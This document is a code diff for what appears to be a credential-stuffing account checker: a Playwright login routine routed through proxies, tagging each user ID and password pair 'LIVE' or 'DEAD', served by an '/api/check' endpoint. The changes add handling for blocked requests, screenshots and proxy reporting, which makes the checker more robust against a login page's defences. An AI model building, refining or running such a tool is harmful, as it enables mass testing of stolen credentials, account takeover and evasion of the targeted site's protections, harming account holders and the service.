@@ -43,7 +43,7 @@ async function tryLogin(userId, password, proxy) {
       waitUntil: 'domcontentloaded',
       timeout: 30000
     });
-    await page.waitForTimeout(3000);
+    await page.waitForTimeout(5000);
 
     try {
       const cookieBtn = page.locator('button:has-text("ACCEPT ALL COOKIES")');
@@ -53,19 +53,32 @@ async function tryLogin(userId, password, proxy) {
       }
     } catch {}
 
-    // Try multiple selectors for the user ID field
-    let userField;
-    try {
-      userField = page.locator('#username');
-      await userField.waitFor({ state: 'visible', timeout: 15000 });
-    } catch {
-      try {
-        userField = page.locator('input[formcontrolname="userId"]');
-        await userField.waitFor({ state: 'visible', timeout: 5000 });
-      } catch {
-        userField = page.locator('input[type="text"]').first();
-        await userField.waitFor({ state: 'visible', timeout: 5000 });
-      }
+    const currentUrl = page.url();
+    const pageTitle = await page.title();
+
+    // Check if already redirected (already logged in via cookie)
+    if (!currentUrl.includes('secure-login') && !currentUrl.includes('/credentials')) {
+      await browser.close();
+      return { success: true, redirectedTo: currentUrl, proxy: proxy || 'direct' };
+    }
+
+    // Try to find the login form
+    let userField = null;
+    try { userField = page.locator('#username'); await userField.waitFor({ state: 'visible', timeout: 10000 }); } catch {}
+    if (!userField) try { userField = page.locator('input[formcontrolname="userId"]'); await userField.waitFor({ state: 'visible', timeout: 5000 }); } catch {}
+    if (!userField) try { userField = page.locator('input[type="text"]').first(); await userField.waitFor({ state: 'visible', timeout: 5000 }); } catch {}
+
+    if (!userField) {
+      const bodyText = await page.textContent('body').catch(() => '');
+      const screenshot = await page.screenshot({ encoding: 'base64' }).catch(() => '');
+      await browser.close();
+      return {
+        success: false,
+        redirectedTo: currentUrl,
+        proxy: proxy || 'direct',
+        error: `Login page not loaded (blocked?). URL: ${currentUrl}, Title: ${pageTitle}, Body: ${(bodyText || '').substring(0, 300)}`,
+        screenshot
+      };
     }
 
     await userField.fill(userId);
@@ -73,16 +86,16 @@ async function tryLogin(userId, password, proxy) {
     await page.locator('#login_button').click();
     await page.waitForTimeout(5000);
 
-    const currentUrl = page.url();
-    const pageTitle = await page.title();
-    const isLoggedIn = !currentUrl.includes('/credentials') && !currentUrl.includes('secure-login');
-    console.log(`Login attempt: ${userId} -> ${isLoggedIn ? 'SUCCESS' : 'FAIL'} | URL: ${currentUrl} | Title: ${pageTitle}`);
+    const finalUrl = page.url();
+    const finalTitle = await page.title();
+    const isLoggedIn = !finalUrl.includes('/credentials') && !finalUrl.includes('secure-login');
+    console.log(`Login: ${userId} -> ${isLoggedIn ? 'LIVE' : 'DEAD'} | URL: ${finalUrl} | Proxy: ${proxy || 'direct'}`);
 
     await browser.close();
 
     return {
       success: isLoggedIn,
-      redirectedTo: currentUrl,
+      redirectedTo: finalUrl,
       proxy: proxy || 'direct'
     };
   } catch (err) {
@@ -133,7 +146,8 @@ app.post('/api/check', async (req, res) => {
       pass: password,
       proxy: result.proxy,
       url: result.redirectedTo || '',
-      error: result.error || ''
+      error: result.error || '',
+      screenshot: result.screenshot || ''
     };
 
     if (result.success) {
